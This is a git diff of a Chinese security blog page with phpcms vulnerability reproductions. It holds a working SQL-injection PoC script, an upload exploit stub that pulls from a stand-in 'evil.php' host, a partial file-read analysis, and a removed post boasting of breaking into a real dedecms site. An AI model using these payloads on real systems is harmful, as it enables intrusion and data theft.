-        $this-&gt;groupid = param::get_cookie(&#39;_groupid&#39;) ? param::get_cookie(&#39;_groupid&#39;) : 8;
-        //判断是否登录
-        if(empty($this-&gt;userid)){
-            showmessage(L(&#39;please_login&#39;,&#39;&#39;,&#39;member&#39;));
-        }
-    }</code></pre>
-<p>我们需要用<code>sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;)</code>来生成<code>$this-&gt;userid</code>,来绕过死亡exit</p>
-<p>这次我们还需要找一个地方来生成<code>userid</code>,但是限制更少了,只要<code>$this-&gt;userid</code>不为空即可</p>
-<p> 我们可以搜到 <code>phpcms/modules/wap/index.php</code> 文件，在该文件中 <code>$_GET[&#39;siteid&#39;]</code> 可控，并且可以通过 <strong>cookie</strong> 获得加密后的数据,虽然有intval来过滤</p>
-<pre><code class="php">function __construct() {        
-        $this-&gt;db = pc_base::load_model(&#39;content_model&#39;);
-        $this-&gt;siteid = isset($_GET[&#39;siteid&#39;]) &amp;&amp; (intval($_GET[&#39;siteid&#39;]) &gt; 0) ? intval(trim($_GET[&#39;siteid&#39;])) : (param::get_cookie(&#39;siteid&#39;) ? param::get_cookie(&#39;siteid&#39;) : 1);
-        param::set_cookie(&#39;siteid&#39;,$this-&gt;siteid);    
-        $this-&gt;wap_site = getcache(&#39;wap_site&#39;,&#39;wap&#39;);
-        $this-&gt;types = getcache(&#39;wap_type&#39;,&#39;wap&#39;);
-        $this-&gt;wap = $this-&gt;wap_site[$this-&gt;siteid];
-        define(&#39;WAP_SITEURL&#39;, $this-&gt;wap[&#39;domain&#39;] ? $this-&gt;wap[&#39;domain&#39;].&#39;index.php?&#39; : APP_PATH.&#39;index.php?m=wap&amp;siteid=&#39;.$this-&gt;siteid);
-        if($this-&gt;wap[&#39;status&#39;]!=1) exit(L(&#39;wap_close_status&#39;));
-    }</code></pre>
-<p>于是整个攻击链便完整了</p>
-<p>先利用wap来获得<code>userid</code></p>
-<p><code>http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=wap&amp;siteid=1</code></p>
-<p><code>2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</code></p>
-<p>再利用attachment来获得加密的恶意sql语句</p>
-<pre><code>http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;src=(看poc吧)
-post:
-userid_flash=2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</code></pre><h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><pre><code class="python">import re
-import requests
-import random
-
-def poc(url,proxies={}):
-    sess=requests.session()
-    sess.get(&quot;%s/index.php?m=wap&amp;siteid=1&quot;%url)
-    sess.proxies=proxies
-    pre=list(sess.cookies.get_dict())[0][:5]+&quot;_&quot;
-    userid=sess.cookies.get_dict()[pre+&quot;siteid&quot;]
-    param={
-        &quot;m&quot;:&quot;attachment&quot;,
-        &quot;c&quot;:&quot;attachments&quot;,
-        &quot;a&quot;:&quot;swfupload_json&quot;,
-        &quot;src&quot;:&quot;=1&amp;id=nobodyasdfsdsf%2;7-(updatexml(1,concat(0x7e,(select%2;0user()),0x7e),1))%23&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=1&amp;ss&quot;
-    }
-    sess.post(&quot;%s/index.php&quot;%url,params=param,data={&quot;userid_flash&quot;:userid})
-    a_k=sess.cookies.get_dict()[pre+&quot;att_json&quot;]
-    result=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=%s&quot;%(url,a_k)).text
-    #print(userid,a_k)
-    if &quot;XPATH syntax error&quot; in result:
-        return True
-    return False
-
-
-#,{&quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;}
-print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.0/&quot;))</code></pre>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集</a></p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/13/phpcmsv9.6.0SQL注入/">http://blog.ccreater.top/2020/02/13/phpcmsv9.6.0SQL注入/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/02/13/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/" data-id="ckmn4mn390059g4ni8ihg82pm" data-title="phpcmsv9.6.0SQL注入" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
-
     </footer>
   </div>
   
@@ -1962,8 +1477,8 @@ print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.0/&quot;))</code></pre>
   
     <article id="post-phpcms960任意文件上传复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/" class="article-date">
-  <time class="dt-published" datetime="2020-02-12T13:55:39.359Z" itemprop="datePublished">2020-02-12</time>
+    <a href="/1970/01/01/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
 </a>
     
   <div class="article-category">
@@ -1978,7 +1493,7 @@ print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.0/&quot;))</code></pre>
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/">phpcms960任意文件上传复现</a>
+      <a class="p-name article-title" href="/1970/01/01/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/">phpcms960任意文件上传复现</a>
     </h1>
   
 
@@ -2171,12 +1686,12 @@ def exp(url,evilurl=&quot;http://xxxxxxx/evil.php&quot;):
 
 
 exp(&quot;http://127.0.0.1/cms/phpcms/9.6.0&quot;)</code></pre>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/12/phpcms960任意文件上传复现/">http://blog.ccreater.top/2020/02/12/phpcms960任意文件上传复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/phpcms960任意文件上传复现/">https://www.ccreater.top/1970/01/01/phpcms960任意文件上传复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/" data-id="ckmn4mn35004zg4niet9jcjs4" data-title="phpcms960任意文件上传复现" class="article-share-link">Share</a>
+      <a data-url="https://www.ccreater.top/1970/01/01/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/" data-id="ckmn57579006ds1nigmeuhrag" data-title="phpcms960任意文件上传复现" class="article-share-link">Share</a>
       
 	  
       
@@ -2193,14 +1708,14 @@ exp(&quot;http://127.0.0.1/cms/phpcms/9.6.0&quot;)</code></pre>
 
 
   
-    <article id="post-记一次漏洞挖掘" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-phpcmsv9.6.0SQL注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" class="article-date">
-  <time class="dt-published" datetime="2020-02-11T05:54:56.708Z" itemprop="datePublished">2020-02-11</time>
+    <a href="/1970/01/01/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
 </a>
     
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a>
+    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
   </div>
 
   </div>
@@ -2211,7 +1726,7 @@ exp(&quot;http://127.0.0.1/cms/phpcms/9.6.0&quot;)</code></pre>
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">记一次漏洞挖掘</a>
+      <a class="p-name article-title" href="/1970/01/01/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/">phpcmsv9.6.0SQL注入</a>
     </h1>
   
 
@@ -2219,30 +1734,573 @@ exp(&quot;http://127.0.0.1/cms/phpcms/9.6.0&quot;)</code></pre>
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="无标题"><a href="#无标题" class="headerlink" title="无标题"></a>无标题</h1><p>某个月黑风高的晚上,我突然想起了我的复古游戏机还差一点库币,于是决定去挖个洞 …….</p>
-<p>经过一番惨绝人寰,欲罢不能的信息收集后,我开始了fuzz,然后 ip被ban:(</p>
-<p>主要的信息为:</p>
-<pre><code>dedecms 5.7sp1 20150618
-ZOHO ManageEngine OpManager
-adminer 4.6.3</code></pre><p>爆破密码,fuzz文件啥的都干过,dedecms的后台也没爆出来,但是发现他们服务器配置错误,可以浏览目录</p>
-<p>把该版本的dedecms之后的更新对比了以下,没发现有啥洞,此时就陷入了僵局</p>
-<p>但是,我随手点了一个<code>en</code>的超链接,就发现了一个新的域名!!!!</p>
-<p>然后这个域名下的服务,也是dedecms,而后台就是<code>/dede</code></p>
-<p>利用前面发现的目录浏览,我成功拿到了<code>admin</code>的session,直接进入后台getshell</p>
-<p><strong>一些网站的英文站点可能就是我们的突破口</strong></p>
-<p>资产收集真的太重要了,要不是这次运气好,我还不知道啥时候能日掉</p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/11/记一次漏洞挖掘/">http://blog.ccreater.top/2020/02/11/记一次漏洞挖掘/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+        <h1 id="phpcmsv9-6-0SQL注入"><a href="#phpcmsv9-6-0SQL注入" class="headerlink" title="phpcmsv9.6.0SQL注入"></a>phpcmsv9.6.0SQL注入</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
+<li>开启wap</li>
+<li>phpcms 版本小于等于9.6.0</li>
+</ol>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞信息:</p>
+<blockquote>
+<p>这个版本的 <strong>SQL注入</strong> 主要在于程序对解密后的数据没有进行过滤. 漏洞文件: <strong>phpcms/modules/content/down.php</strong> 。在其 <strong>init</strong> 方法中，从 <strong>GET</strong> 数据中获取了 <strong>a_k</strong> 的值 ,解密后直接变量覆盖,导致命令执行</p>
+</blockquote>
+<pre><code class="php">public function init() {
+        $a_k = trim($_GET[&#39;a_k&#39;]);
+        $a_k = sys_auth($a_k, &#39;DECODE&#39;, pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;));
+        if(empty($a_k)) showmessage(L(&#39;illegal_parameters&#39;));
+        parse_str($a_k);
+        if(isset($i)) $i = $id = intval($i);
+        if(!isset($m)) showmessage(L(&#39;illegal_parameters&#39;));
+        if(!isset($modelid)||!isset($catid)) showmessage(L(&#39;illegal_parameters&#39;));
+        if(empty($f)) showmessage(L(&#39;url_invalid&#39;));
+        $allow_visitor = 1;
+        $MODEL = getcache(&#39;model&#39;,&#39;commons&#39;);
+        $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid][&#39;tablename&#39;];
+        $this-&gt;db-&gt;table_name = $tablename.&#39;_data&#39;;
+        $rs = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));    
+        ...
+    }</code></pre>
+<p><code>$this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));</code>跟进去</p>
+<pre><code class="php">final public function get_one($where = &#39;&#39;, $data = &#39;*&#39;, $order = &#39;&#39;, $group = &#39;&#39;) {
+        if (is_array($where)) $where = $this-&gt;sqls($where);
+        return $this-&gt;db-&gt;get_one($data, $this-&gt;table_name, $where, $order, $group);
+    }</code></pre>
+<pre><code class="php">final public function sqls($where, $font = &#39; AND &#39;) {
+        if (is_array($where)) {
+            $sql = &#39;&#39;;
+            foreach ($where as $key=&gt;$val) {
+                $sql .= $sql ? &quot; $font `$key` = &#39;$val&#39; &quot; : &quot; `$key` = &#39;$val&#39;&quot;;
+            }
+            return $sql;
+        } else {
+            return $where;
+        }
+    }</code></pre>
+<pre><code class="php">public function get_one($data, $table, $where = &#39;&#39;, $order = &#39;&#39;, $group = &#39;&#39;) {
+        $where = $where == &#39;&#39; ? &#39;&#39; : &#39; WHERE &#39;.$where;
+        $order = $order == &#39;&#39; ? &#39;&#39; : &#39; ORDER BY &#39;.$order;
+        $group = $group == &#39;&#39; ? &#39;&#39; : &#39; GROUP BY &#39;.$group;
+        $limit = &#39; LIMIT 1&#39;;
+        $field = explode( &#39;,&#39;, $data);
+        array_walk($field, array($this, &#39;add_special_char&#39;));
+        $data = implode(&#39;,&#39;, $field);
+
+        $sql = &#39;SELECT &#39;.$data.&#39; FROM `&#39;.$this-&gt;config[&#39;database&#39;].&#39;`.`&#39;.$table.&#39;`&#39;.$where.$group.$order.$limit;
+        $this-&gt;execute($sql);
+        $res = $this-&gt;fetch_next();
+        $this-&gt;free_result();
+        return $res;
+    }</code></pre>
+<p>没有对解密后的id进行任何过滤</p>
+<p>接着要找一个能用相同密钥加密的地方,这样便无需暴露auth_key就能执行恶意sql语句</p>
+<p>我们利用<code>set_cookie</code>来生成加密数据</p>
+<p><code>setcookie($var, sys_auth($value, &#39;ENCODE&#39;), $time, pc_base::load_config(&#39;system&#39;,&#39;cookie_path&#39;), pc_base::load_config(&#39;system&#39;,&#39;cookie_domain&#39;), $s);</code></p>
+<p>查找调用<code>set_cookie</code>且值<code>$value</code>可控的位置</p>
+<p><code>phpcms/modules/attachment/attachments.php</code> 文件的 <code>swfupload_json</code> 方法有满足我们需要的代码。(菜鸡直接看别人找到的)</p>
+<pre><code class="php">public function swfupload_json() {
+        $arr[&#39;aid&#39;] = intval($_GET[&#39;aid&#39;]);
+        $arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));
+        $arr[&#39;filename&#39;] = urlencode(safe_replace($_GET[&#39;filename&#39;]));
+        $json_str = json_encode($arr);
+        $att_arr_exist = param::get_cookie(&#39;att_json&#39;);
+        $att_arr_exist_tmp = explode(&#39;||&#39;, $att_arr_exist);
+        if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) {
+            return true;
+        } else {
+            $json_str = $att_arr_exist ? $att_arr_exist.&#39;||&#39;.$json_str : $json_str;
+            param::set_cookie(&#39;att_json&#39;,$json_str);
+            return true;            
+        }
+    }</code></pre>
+<p><code>$arr[&#39;src&#39;] = safe_replace(trim($_GET[&#39;src&#39;]));</code>,跟进<code>safe_replace</code></p>
+<pre><code class="php">function safe_replace($string) {
+    $string = str_replace(&#39;%20&#39;,&#39;&#39;,$string);
+    $string = str_replace(&#39;%27&#39;,&#39;&#39;,$string);
+    $string = str_replace(&#39;%2527&#39;,&#39;&#39;,$string);
+    $string = str_replace(&#39;*&#39;,&#39;&#39;,$string);
+    $string = str_replace(&#39;&quot;&#39;,&#39;&amp;quot;&#39;,$string);
+    $string = str_replace(&quot;&#39;&quot;,&#39;&#39;,$string);
+    $string = str_replace(&#39;&quot;&#39;,&#39;&#39;,$string);
+    $string = str_replace(&#39;;&#39;,&#39;&#39;,$string);
+    $string = str_replace(&#39;&lt;&#39;,&#39;&amp;lt;&#39;,$string);
+    $string = str_replace(&#39;&gt;&#39;,&#39;&amp;gt;&#39;,$string);
+    $string = str_replace(&quot;{&quot;,&#39;&#39;,$string);
+    $string = str_replace(&#39;}&#39;,&#39;&#39;,$string);
+    $string = str_replace(&#39;\\&#39;,&#39;&#39;,$string);
+    return $string;
+}</code></pre>
+<p>虽然这里单引号被过滤了,但是前面是用<code>parse_str($a_k);</code>来恢复变量的,我们可以利用<code>safe_replace</code>能将某些字符替换为空格用url编码来绕过黑名单</p>
+<p>但是在调用<code>swfupload_json</code> 前,它还会调用<code>__construct</code>方法</p>
+<pre><code class="php">function __construct() {
+        pc_base::load_app_func(&#39;global&#39;);
+        $this-&gt;upload_url = pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;);
+        $this-&gt;upload_path = pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;);        
+        $this-&gt;imgext = array(&#39;jpg&#39;,&#39;gif&#39;,&#39;png&#39;,&#39;bmp&#39;,&#39;jpeg&#39;);
+        $this-&gt;userid = $_SESSION[&#39;userid&#39;] ? $_SESSION[&#39;userid&#39;] : (param::get_cookie(&#39;_userid&#39;) ? param::get_cookie(&#39;_userid&#39;) : sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;));
+        $this-&gt;isadmin = $this-&gt;admin_username = $_SESSION[&#39;roleid&#39;] ? 1 : 0;
+        $this-&gt;groupid = param::get_cookie(&#39;_groupid&#39;) ? param::get_cookie(&#39;_groupid&#39;) : 8;
+        //判断是否登录
+        if(empty($this-&gt;userid)){
+            showmessage(L(&#39;please_login&#39;,&#39;&#39;,&#39;member&#39;));
+        }
+    }</code></pre>
+<p>我们需要用<code>sys_auth($_POST[&#39;userid_flash&#39;],&#39;DECODE&#39;)</code>来生成<code>$this-&gt;userid</code>,来绕过死亡exit</p>
+<p>这次我们还需要找一个地方来生成<code>userid</code>,但是限制更少了,只要<code>$this-&gt;userid</code>不为空即可</p>
+<p> 我们可以搜到 <code>phpcms/modules/wap/index.php</code> 文件，在该文件中 <code>$_GET[&#39;siteid&#39;]</code> 可控，并且可以通过 <strong>cookie</strong> 获得加密后的数据,虽然有intval来过滤</p>
+<pre><code class="php">function __construct() {        
+        $this-&gt;db = pc_base::load_model(&#39;content_model&#39;);
+        $this-&gt;siteid = isset($_GET[&#39;siteid&#39;]) &amp;&amp; (intval($_GET[&#39;siteid&#39;]) &gt; 0) ? intval(trim($_GET[&#39;siteid&#39;])) : (param::get_cookie(&#39;siteid&#39;) ? param::get_cookie(&#39;siteid&#39;) : 1);
+        param::set_cookie(&#39;siteid&#39;,$this-&gt;siteid);    
+        $this-&gt;wap_site = getcache(&#39;wap_site&#39;,&#39;wap&#39;);
+        $this-&gt;types = getcache(&#39;wap_type&#39;,&#39;wap&#39;);
+        $this-&gt;wap = $this-&gt;wap_site[$this-&gt;siteid];
+        define(&#39;WAP_SITEURL&#39;, $this-&gt;wap[&#39;domain&#39;] ? $this-&gt;wap[&#39;domain&#39;].&#39;index.php?&#39; : APP_PATH.&#39;index.php?m=wap&amp;siteid=&#39;.$this-&gt;siteid);
+        if($this-&gt;wap[&#39;status&#39;]!=1) exit(L(&#39;wap_close_status&#39;));
+    }</code></pre>
+<p>于是整个攻击链便完整了</p>
+<p>先利用wap来获得<code>userid</code></p>
+<p><code>http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=wap&amp;siteid=1</code></p>
+<p><code>2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</code></p>
+<p>再利用attachment来获得加密的恶意sql语句</p>
+<pre><code>http://127.0.0.1/cms/phpcms/9.6.0/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;src=(看poc吧)
+post:
+userid_flash=2a8a6kid_pv1EoSGXugr-5BZDZWzDhaB7W3EtXou</code></pre><h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><pre><code class="python">import re
+import requests
+import random
+
+def poc(url,proxies={}):
+    sess=requests.session()
+    sess.get(&quot;%s/index.php?m=wap&amp;siteid=1&quot;%url)
+    sess.proxies=proxies
+    pre=list(sess.cookies.get_dict())[0][:5]+&quot;_&quot;
+    userid=sess.cookies.get_dict()[pre+&quot;siteid&quot;]
+    param={
+        &quot;m&quot;:&quot;attachment&quot;,
+        &quot;c&quot;:&quot;attachments&quot;,
+        &quot;a&quot;:&quot;swfupload_json&quot;,
+        &quot;src&quot;:&quot;=1&amp;id=nobodyasdfsdsf%2;7-(updatexml(1,concat(0x7e,(select%2;0user()),0x7e),1))%23&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=1&amp;ss&quot;
+    }
+    sess.post(&quot;%s/index.php&quot;%url,params=param,data={&quot;userid_flash&quot;:userid})
+    a_k=sess.cookies.get_dict()[pre+&quot;att_json&quot;]
+    result=sess.get(&quot;%s/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=%s&quot;%(url,a_k)).text
+    #print(userid,a_k)
+    if &quot;XPATH syntax error&quot; in result:
+        return True
+    return False
+
+
+#,{&quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;}
+print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.0/&quot;))</code></pre>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcms漏洞分析合集</a></p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/1970/01/01/phpcmsv9.6.0SQL注入/">https://www.ccreater.top/1970/01/01/phpcmsv9.6.0SQL注入/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" data-id="ckmn4mn3y0081g4ni40mmbzyk" data-title="记一次漏洞挖掘" class="article-share-link">Share</a>
+      <a data-url="https://www.ccreater.top/1970/01/01/phpcmsv9.6.0SQL%E6%B3%A8%E5%85%A5/" data-id="ckmn5757a006hs1ni9b0kc048" data-title="phpcmsv9.6.0SQL注入" class="article-share-link">Share</a>
       
 	  
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
 
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
+    <article id="post-phpcmsv9.6.1任意文件读取" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/1970/01/01/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
+  <time class="dt-published" datetime="1970-01-01T00:00:00.000Z" itemprop="datePublished">1970-01-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/1970/01/01/phpcmsv9.6.1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">phpcmsv9.6.1任意文件读取</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="phpcmsv9-6-1任意文件读取"><a href="#phpcmsv9-6-1任意文件读取" class="headerlink" title="phpcmsv9.6.1任意文件读取"></a>phpcmsv9.6.1任意文件读取</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞位置: <code>phpcms/modules/content/down.php</code> 。在该文件的 <code>download</code> 方法中最后一行调用了 <code>file_down</code> 文件下载函数，我们可以看到其第一个参数是要读取的文件路径。 </p>
+<pre><code class="php">    public function download() {
+        $a_k = trim($_GET[&#39;a_k&#39;]);
+        $pc_auth_key = md5(pc_base::load_config(&#39;system&#39;,&#39;auth_key&#39;).$_SERVER[&#39;HTTP_USER_AGENT&#39;].&#39;down&#39;);
+        $a_k = sys_auth($a_k, &#39;DECODE&#39;, $pc_auth_key);
+        if(empty($a_k)) showmessage(L(&#39;illegal_parameters&#39;));
+        unset($i,$m,$f,$t,$ip);
+        parse_str($a_k);        
+        ...
+        $starttime = intval($t);
+        if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$f) || strpos($f, &quot;:\\&quot;)!==FALSE || strpos($f,&#39;..&#39;)!==FALSE) showmessage(L(&#39;url_error&#39;));
+        $fileurl = trim($f);
+        if(!$downid || empty($fileurl) || !preg_match(&quot;/[0-9]{10}/&quot;, $starttime) || !preg_match(&quot;/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/&quot;, $ip) || $ip != ip()) showmessage(L(&#39;illegal_parameters&#39;));    
+        $endtime = SYS_TIME - $starttime;
+        if($endtime &gt; 3600) showmessage(L(&#39;url_invalid&#39;));
+        if($m) $fileurl = trim($s).trim($fileurl);
+        if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$fileurl) ) showmessage(L(&#39;url_error&#39;));
+        //远程文件
+        if(strpos($fileurl, &#39;:/&#39;) &amp;&amp; (strpos($fileurl, pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;)) === false)) { 
+            header(&quot;Location: $fileurl&quot;);
+        } else {
+            if($d == 0) {
+                header(&quot;Location: &quot;.$fileurl);
+            } else {
+                $fileurl = str_replace(array(pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;),&#39;/&#39;), array(pc_base::load_config(&#39;system&#39;,&#39;upload_path&#39;),DIRECTORY_SEPARATOR), $fileurl);
+                $filename = basename($fileurl);
+                //处理中文文件
+                if(preg_match(&quot;/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/&quot;, $fileurl)) {
+                    $filename = str_replace(array(&quot;%5C&quot;, &quot;%2F&quot;, &quot;%3A&quot;), array(&quot;\\&quot;, &quot;/&quot;, &quot;:&quot;), urlencode($fileurl));
+                    $filename = urldecode(basename($filename));
+                }
+                $ext = fileext($filename);
+                $filename = date(&#39;Ymd_his&#39;).random(3).&#39;.&#39;.$ext;
+                $fileurl=str_replace(array(&quot;&lt;&quot;,&quot;&gt;&quot;),&quot;&quot;,$fileurl);
+                file_down($fileurl, $filename);
+            }
+        }
+    }</code></pre>
+<p>我们跟进<code>file_down</code>:</p>
+<pre><code class="php">function file_down($filepath, $filename = &#39;&#39;) {
+    if(!$filename) $filename = basename($filepath);
+    if(is_ie()) $filename = rawurlencode($filename);
+    $filetype = fileext($filename);
+    $filesize = sprintf(&quot;%u&quot;, filesize($filepath));
+    if(ob_get_length() !== false) @ob_end_clean();
+    header(&#39;Pragma: public&#39;);
+    header(&#39;Last-Modified: &#39;.gmdate(&#39;D, d M Y H:i:s&#39;) . &#39; GMT&#39;);
+    header(&#39;Cache-Control: no-store, no-cache, must-revalidate&#39;);
+    header(&#39;Cache-Control: pre-check=0, post-check=0, max-age=0&#39;);
+    header(&#39;Content-Transfer-Encoding: binary&#39;);
+    header(&#39;Content-Encoding: none&#39;);
+    header(&#39;Content-type: &#39;.$filetype);
+    header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.$filename.&#39;&quot;&#39;);
+    header(&#39;Content-length: &#39;.$filesize);
+    readfile($filepath);
+    exit;
+}</code></pre>
+<p>可以看到他会直接读取文件然后,exit</p>
+<p>我们再看下<code>download</code>中的<code>$fileurl</code>的生成过程:</p>
+<pre><code class="php">if(preg_match(&#39;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&#39;,$f) || strpos($f, &quot;:\\&quot;)!==FALSE || strpos($f,&#39;..&#39;)!==FALSE) showmessage(L(&#39;url_error&#39;));
+if($m) $fileurl = trim($s).trim($fileurl);
